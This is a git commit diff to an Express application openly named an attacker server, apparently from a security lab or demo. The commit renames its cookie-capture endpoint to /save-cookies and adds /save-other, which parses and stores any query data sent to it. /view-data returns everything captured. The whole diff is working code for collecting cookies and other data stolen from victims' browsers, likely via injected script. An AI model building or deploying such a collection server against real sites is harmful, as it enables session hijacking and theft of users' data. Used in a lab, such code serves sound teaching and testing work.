4d3b8bf483ab45a135f0455d20ce9be427a73763
Thiago Farias <tfarias@protonmail.com>
2023-04-05 11:13:19 -0300

    update attacker server with "save-other" for non-specific data

--- attacker-server/app.js
+++ attacker-server/app.js
@@ -2,11 +2,13 @@ import express from 'express';
 import cookieParser from "cookie-parser";
 import cors from 'cors';
 import {createLogger} from "bunyan";
+import qs from 'qs';
 
 const logger = createLogger({ name: 'attacker-service' });
 
 const app = express();
-const data = new Set();
+const capturedCookies = new Set();
+const capturedOtherData = [];
 
 app.use(cors());
 app.use(express.json());
@@ -16,20 +18,27 @@ app.use(cookieParser());
 app.disable('x-powered-by');
 
 app.get('/view-data', (req, res) => {
-  const dataAsArray = Array(...data);
-  logger.info(dataAsArray);
-  res.json(dataAsArray);
+  const dataAsArray = Array(...capturedCookies);
+  res.json({ capturedCookies: dataAsArray, capturedOtherData });
 });
 
-app.get('/save-data', (req, res) => {
+app.get('/save-cookies', (req, res) => {
   const cookie = decodeURIComponent(req.query.cookies);
-  data.add(cookie);
+  capturedCookies.add(cookie);
   logger.info('Saved data: ', cookie);
+  res.end();
+});
+
+app.get('/save-other', (req, res) => {
+  const parsed = qs.parse(req.query);
+  logger.info(parsed);
+  capturedOtherData.push(parsed);
   res.end();
 });
 
 app.listen(8081, '0.0.0.0', () => {
   logger.info('Attacker listening at address http://localhost:8081');
   logger.info('GET /view-data');
-  logger.info('GET /save-data');
+  logger.info('GET /save-cookies');
+  logger.info('GET /save-other');
 });
